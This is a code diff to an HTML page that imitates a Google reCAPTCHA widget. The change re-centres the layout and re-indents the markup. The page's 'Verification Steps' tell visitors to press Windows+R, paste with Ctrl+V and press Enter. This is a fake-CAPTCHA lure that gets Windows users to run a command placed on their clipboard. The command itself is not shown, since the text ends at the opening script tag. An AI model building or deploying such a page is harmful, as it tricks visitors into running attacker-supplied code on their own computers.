@@ -30,6 +30,13 @@
             line-height: normal;
         }
 
+        .content {
+            transform: translate(-50%, -50%);
+            top: 50%;
+            left: 50%;
+            position: absolute;
+        }
+
         .checkbox-window {
             height: 74px;
             width: 300px;
@@ -226,65 +233,66 @@
         </style>
     </head>
     <body>
-
-    <div class="container m-p">    
-        <div id="checkbox-window" class="checkbox-window m-p block">
-            <div class="checkbox-container m-p">
-                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
-            </div>
-            <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="captcha-logo line-normal" alt="">
-            <br>
-            <p class="checkbox-desc m-p line-normal">
-                <span style="font-size: 10px; font-weight: 400; line-height: 10px;">reCAPTCHA</span>
-                <br>
-                <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
-            </p>
-            <img class="spinner" alt="" id="spinner">
-        </div>
-        
-        <div id="verify-window" class="verify-window">
-            <div class="verify-container">
-                <header class="verify-header">
-                    <span class="verify-header-text-medium m-p block">Complete these</span>
-                    <span class="verify-header-text-big m-p block">Verification Steps</span>
-                    <span class="verify-header-text-medium m-p block"></span>
-                </header>
-                <main class="verify-main">
-                    <p>
-                        To prove you are not a robot, please:
-                    </p>
-                    <ol>
-                        <li>
-                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
-                        </li>
-                        
-                        <li>
-                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
-                        </li>
-
-                        <li>
-                            Press <b>Enter</b> on your keyboard to finish.
-                        </li>
-                    </ol>
-                    <p>
-                        You will observe and agree:
-                        <br>
-                    <code>
-                        ✅ I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>
-                    </code>
-                    </p>
-
-                   
-                </main>
-            </div>
-            <footer class="verify-container verify-footer">
-                <div class="verify-footer-left">
-                    Perform the steps above to finish verification.
+    <div class="content">
+        <div class="container m-p">    
+            <div id="checkbox-window" class="checkbox-window m-p block">
+                <div class="checkbox-container m-p">
+                    <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
                 </div>
-                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
-            </footer>
-        </div>        
+                <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="captcha-logo line-normal" alt="">
+                <br>
+                <p class="checkbox-desc m-p line-normal">
+                    <span style="font-size: 10px; font-weight: 400; line-height: 10px;">reCAPTCHA</span>
+                    <br>
+                    <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                </p>
+                <img class="spinner" alt="" id="spinner">
+            </div>
+            
+            <div id="verify-window" class="verify-window">
+                <div class="verify-container">
+                    <header class="verify-header">
+                        <span class="verify-header-text-medium m-p block">Complete these</span>
+                        <span class="verify-header-text-big m-p block">Verification Steps</span>
+                        <span class="verify-header-text-medium m-p block"></span>
+                    </header>
+                    <main class="verify-main">
+                        <p>
+                            To prove you are not a robot, please:
+                        </p>
+                        <ol>
+                            <li>
+                                Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                            </li>
+                            
+                            <li>
+                                In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                            </li>
+    
+                            <li>
+                                Press <b>Enter</b> on your keyboard to finish.
+                            </li>
+                        </ol>
+                        <p>
+                            You will observe and agree:
+                            <br>
+                        <code>
+                            ✅ I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>
+                        </code>
+                        </p>
+    
+                       
+                    </main>
+                </div>
+                <footer class="verify-container verify-footer">
+                    <div class="verify-footer-left">
+                        Perform the steps above to finish verification.
+                    </div>
+                    <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+                </footer>
+            </div>        
+        </div>
     </div>
 
     <script>
